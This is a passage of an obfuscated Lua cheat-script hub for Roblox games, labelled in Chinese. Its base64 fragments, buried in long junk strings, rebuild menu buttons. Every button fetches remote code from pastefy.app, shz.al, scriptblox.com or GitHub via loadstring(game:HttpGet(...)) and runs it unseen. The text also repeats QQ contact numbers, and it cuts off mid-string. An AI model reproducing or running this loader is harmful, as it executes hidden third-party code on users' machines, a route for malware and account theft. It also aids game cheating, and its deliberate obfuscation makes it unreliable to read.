A==')旗帜战争（名字相同脚本不同）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('buIiLMwKelyZWwVlCcZnOchezcvylqUDHCkbuxczAMvUlzEiCrNosuAgriynbPWItmKjhjLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastefy.app/otEg6PJV/rawtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('TVtNgvifCBtWnIGyCvvExrExhxVhUHhZUIuOprxqkQQASBPrQahUzumZqKMySTaxBWVMJPKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')法宝模拟器tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('IWADGpmuPdUfkrqZPEGpafeoMtyUgmPIEawXkwAgFdhdPFRWHeIKbqVybqMITYZRJMHfMcLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('vyhhuGiWCIKlrqujYIuIfuTEwvmzCkWoMYOAzomQxeiHnKYPCQeeNUzXRRJCqCUGzRemiqKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('cyIDVgXjwUqDuoynMPTlcNcAbWPtIiBAYVBnDbWRFYZWHAXSrzlYzlTIEXGqyAvZKzpaukLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')法宝模拟器tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('UKNkJDIMQOCLPtTQGEjNLTDcsbghfLOWHNLqDFdyTGZmRiDsgOKiPUZJutsSHFpyfrgFwMLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastefy.app/9bGpv4H3/rawtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('yBYTqPVuElyVmQQdBmNAnIJAnWEsTCjYVNWgWlzcJBuldpfFEtPVCGXiFrPtpmeEtrWwOwKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')法宝模拟器（汉化）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('dFHrCtqrEPrSgbcxfbHRUHanYbDWgoISIBUoeQfiEFipuYTSlJPzmvwLmsiqDMPPIZcBZfLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/zhanghuihuihuil/Script/main/%E6%B3%95%E5%AE%9D%E6%A8%A1%E6%8B%9F%E5%99%A8%E6%B1%89%E5%8C%96tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('YMvkWOCfzLFSpjzPvEYvFExSCbMVTdBSxpwxIfPvkQjIqKFzVdpESkSbeigPCiKXZrIaooKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('GpnWegKrixGzzIgYYTAgKgJezlvYwITtqgQqJBtTLWowsqjZilcggnAGfTbzGDsrCdRukjLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('RTPYQhpEWiSXNiFvfJKVHeslJkvKDCblWLBrBGvlXXufOgTWfCoVZQdyZDHyJtbkhIUPwsamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('hseCotMaCzAqohaRHoFAPrzBfvZtdTCuuwIydmGjnRLjEBYPUXFkKijoCOmvJPiIEqSEWKamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('kEyyeFQgzvCiIJcPARDbfHdUssejzmUyePHEHwJevmNVioFYyudFiIzLGJnghxHAHZqDUEbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ficEJDsuGmVSDrbCmFpYMURIJSuBfYyARAAamBWuYWmFjEhcuntyOyVDGYZOoDoRyTMXUKKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')极速奔驰tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('WUADYLEAgODBHUPYMJYjXJQuFRvgZpTpZaMoCPgFYzbjOgGmkYGxZYWwwtASXDkRxLdgfCLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('wYHJdSOixpVuTXRdCtOcUvpssbhIshnimqoeBgRHqsazgRulMlUlTTbkLpicGbjXlpZTGwKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('goQrQcqPNlsCFDJaKIBiXzRrOAmBVBRsdCUWbTaGWrfxfgpUgDFeHAmCGFiGBEnfgWgEgLLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')极速奔驰tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ZGEfRDglmNaiGwprawICdTqsvNLnTDVfZTvvkCWuHGcuRzGOCIipbZUSXlzayqLxcJVgYLLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastefy.app/Y7607jwb/rawtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HMuffvyJoIrbxAWGPzduTtFFzPsvDeytspezmdRsUTPdqVYtEKSLqNJRViSSxdjcUzqtegKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HvnJOYlPIrJdEJHkpFfthxxMyhGrkNATHvzRrSAJqpigtzYIbYTTMAoDbdMWBOXqoZNevHLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('kuYGmCVSPYjkTVjXyAkgXoVpuUZQmLUMYMbMIgWnXoEfhJzOvqQOmXJACKXfWlNExeJeRMamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('wegNkSnSIHlabicvWNYUeWzZAosEnrFRgbqtwpRMjRkGzVDQatnXbAHxHGkWsuTtuoFHQLamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('oDrCgrIVSUTvvYvnZqFztBBxroqZzOXMUHNFTJDOzNvQAacTREMWYePKXlYXUEYSRwTDhobG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('LCkArWydJweBUxuNEyThXLsNXHyomvGXZNXVMgKHPIqqZkiGaSiSbBTYCHxgmZoBMFVWXcKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')射击光束模拟器tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('IvlYWfxCmZXEhlXeRzJbASbIhVcdmZSKxVtJqKaksieoxhewbSlGIfdRJaaiqWPREQbhJzLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('WAeWjGpDvUMvxaSQVQGfbWyCVZXUFZxBfQNXBPSfgUoYhcMOjLpEqUZivvGkgHZdBYJUffKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HRbNILeLAZbpBqGYYzSrhRYVXToBtYTZKyOKBuBjBfOFLDYbXlqCqckLcBzyuYJrTTxSFkLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')射击光束模拟器tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('XQCMIlnicUPBdBiJTIntYIPNBpYMEYbLvmPRFoPziFXRiPBKOvXjNsxyZzyOpWvbTAgavxLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastefy.app/51yMuaCc/rawtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('zWPgBOJilDaMdMlYcicEnscfJdlqTdjQTlECjdnXPrEcKmuXMyRFsdJpfbcKCwDsmcQeozKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('WqVHLtYvekItQhaRdvYbkwGVMmvbBPDzuIpqVsqdHLPxIzOiAIuVFxjexXSJsmBwlnzuKYLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('dVhZMlclLnPQiAosuBPZpEERCSCQpkwIMLEkowXArhugZDmueSBtFBInrAujzGZifEjzNyamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ZHMbIpmIGxwrSILbLtLAiCiPilZfgUoRgPCkbmRQseYzuMzuNFeaRGRkjYxrMDtfiVpCBMamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VAvULuJQYaKDQOufedPkZpsRWHxodRBcWhWdxjYlmSWBBTLLBNzGbFNBqKCWBlJjdwCgzebG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('rmUpQIDpKfMCZZkYStWJSHikkwmrvzBMIEKARBuaePsFHApmkaoZYkUREqrChqzkqaAbVRKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')合并滴管tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('GjkLOIIhsRtWpYjPYAacIfoGvRhBlVXecnQMAIvUpDOyGragARMaIitmZemDhVyOmrYgNBLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AXlAcvkggChHQhbCNQQhsFhoLvsgLLATzqwoNvLeafjSvfRlsvzvnpbIwdVqUwKGdDtAdpKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('vohbcWEdRoOaulqZLzCXyeTyTNbrPnCCNOgltwUxIEYzMEniVNaLhBIxfkxlmzAkooDVyYLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')合并滴管tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('oufkdabZgtRjsRlOuhHleCQRgDJsJnKOUycpgSMplMVyjerKzyIjiipKszYIXSEhjdGlrBLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastefy.app/NpBrBCqM/rawtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('YyrvhciQVNwRyhhDRXWgzsEGRxXqjiQVbrUwRNxNDgVKGeDJhwwaOTNCEOYwETKNLZvfFpKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('FlOjJhMJvuCOaXIoANhMbcWSbqtuNYqNMtIksBAAAbHknXVDHFPRsQEcVihIgrenfPSLXlLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('QckqjSDqWoffcgxjAUOgPQxNXlxUKauGfgnWtrLDEBCHecXyPmIgEQfiqtXntUeanaXrZHamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('bZgfiVwchGigyYCOJtOHzhIsscTMQzqCNxNawOpoCelyiRBKTUuHcQiKXYnuBPLkizoLQEamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('fBpcWoMBncHJiORygRdqCEShBKhuJsFLehfNxkqnagqCPVhZXFtXycxeSviarmbzvwviNpbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('UWBQPXETYunkgipNgpHPnJFWexBxqCOIyFlgTohOhnVVpoCqkQfgQTRneaZHuNHbMrCPDzKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')成为跑酷忍者脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ouvnNisaidLvckKfqzrtjkYmkQIfeMwFsUoTvkVUucmQWmIgdvdafsYfvjOBRxNAHeiLKxLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ekEyNbNgIZsUFVFgNPbeDqvGgjdNWHtanjGpLPsMfnGLkEZoISDWrSBZIcmOwkjdkXumIhKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('kUFALupcstjtxIpvLPjtnQfSRSigYIUrGBSFNmlSSeZbGCDPvmNdwllvxlGHCtMiWSoqsqLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')成为跑酷忍者tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('cYPrnllFvgvnXghOBQAGEmzylfAkVUrHJfrzdKgpuscxzjOsYLueWLegknQiLpSSxJYYLzLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgo')https://shz.al/~XiaoTian/Script/yydstZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('QXKMIrMoiZyjzQwBCECMOUpWLxLXwuhonIzxWUAOORbyAEKNoRNkuvKdpkpatJOuIwPnyDKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')动感星期五tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('canjibYKPYzOAxSZhgkftcPDhsiIIWkBLipdopRsDfsJTBcfOazwbMIEdbLywYVHmHQFkRLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('eGHWudEnbWTqEYtQuwOAxgzHAQPXEgYQGGbSfiDsoJDgARxNNkkeKbYUcVwtTHsaLgVAIOKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('JcnytjcUBwRVadmxdkvBbQHDkKZtySYyrFaWBpoPrZIdaHtSGLYNYrrVIQDNVnbUinTIeqLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')动感星期五（Auto Click）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('pRFnevCssEJnBoujSRNrRCxGlFHxGBKSUBVXJLixDWTTgLcnlkCwvQujiVjBJJNJgyYHNILGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://scriptblox.com/raw/XMAS-Event-or-Funky-Friday-Auto-Player-Mobile-6721tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('sDNBWRhSdTVTwTPIsIWszaVonHBWAKOALCiFUvIUPbcmurjSsxwWNifUDFfAQAlLRSlmcbKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')动感星期五（自动PK）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('aJhRmuZLNDNmdTCWrSPXrerIjbwonzjWMPjdtcHMBCIbvjjEtQtSTjPgKrlevfNfyQNGhoLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/wally-rblx/funky-friday-autoplay/main/main.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('iCUidWsjEPiXEdnFtIpCbGDLmwrPLSKeAbOoYDxqoCIekSVkUkhdyvgruIrqNVRNNxSqDTLHRydWUpKSgpDQplbmQpDQogICAgY3JlZGl0czpCdXR0b24o')动感星期五tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DMUSqyJbNInUuHaEPEgGgiqZEuzTxOVPNXvTilUvAdAOSlitQTkkcvqBZmeHYOgfMQUWkgLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://scriptblox.com/raw/XMAS-Event-or-Funky-Friday-Auto-Player-Mobile-6721tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('eCCwjNvLHDYyxkXABYZwreKbRuSGDeBZEbrVICoRsUmjSpNptShtmluawUZwqAcvLvvDHDKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('KpQoGjWehTHmnFZTKnzyYFAUciNCPHqMLJpynTpqIXRwtunxsRYtAtzmECCyZxbnbeqLefLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('pfuqcJXBUGXYGalmNLJbWszMMTCAqugZimGQvKuptCUSPUCJYbhsJrpwitaZBAeZHBVVLaamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('qRgedeKkhlXiSrmCMnyuzoQnZZuCOvqQDqEuEFxhiQsnnbafoQSpNszimzlGZeQpcgKUnwamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('UqxobdqXEYNfDruVNEHwyTbTkdHeWvIRDRaPHlCOeLEXvFDULrvLyiSLMoEWnghKPxrovybG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AeoLgOALGCLGrTAQOdCNzDYSLuOmsZTdrhsdSvxRjGgzDyfUTpQwsyrhWbbKUPbMgRHFUAKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')活过杀手tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('nRMrWpwQCJEzhlWKPFvDXXTADyLquLVmnOzYdNaShexPQUKzcRkHVrsXdjLQknkWkOcBcgLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('TPdGiIlqCkJMguEDegpXBKtSZtRowMXuxzTHEEnoHjzWWTOaEljWOUBbqwoDYIuIapTduIKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('FRHifRzjkNeePIEDFCHbojtZcgxlRkuyGqcubdceuSGiWfIAlppeCIEnbOaafhpFMhwXfJLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')活过杀手（垃圾）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VOkczGgjapAinFnbdLutiEXJiSaHLDUuolUPCaSxcCsersIpJGNugEYZxVTGcVLEUAckooLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/Milan08Studio/ChairWare/main/main.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('SrNqLwYTgRDOFEtwsKEmqfFxrSfBrPZGuzubTGwBERGWVqSFalKghTLHmgyFFXOobdXzvVKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本（里面的通用）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AigUIbeIFUNYlQAuNfZzewWOXCzowAUxRGokBgdTEmcMxUUUhRKUYpyROEIFdfpimQgcDjLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('NNYRrmgQOoGZJvFbkNlbRSDROvTmSrcAWAolCfSNPMWuLYPamRtKiZhgSYoieXAnVXvWHGamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('wXgKNpckaYgTrUAiXwFMIkABvuNMpQCRjInZMUZhTawEMrwzUIPcaJIJzFcJLQAWKjIGxdamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('WJWkvRoEcpWiVnNGftEOKdAvbZwVtcoglbsSZcEkzXoaXtXhKmsTjNrHzDPjEIrMXUznBDbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('uLoAZDehpzFlqDrZAjAfuweJzDmAvbIfpmUrjNYwymEnWsvJLhDsJsxJdAlNaTuWOKSYBPKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')起床战争tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('WaWdiePNyKuoTBHvGMnsloCHODNMqKEXOxChKlkJencVTZpRSCoyAmrHensPfimJiQePfNLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('OTGBJOdGqJBRRrLLvoYQQerYJYrWyHNETTrTmeUTJbmetisniCjFOmcxYaznhPHmYldrWqKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI 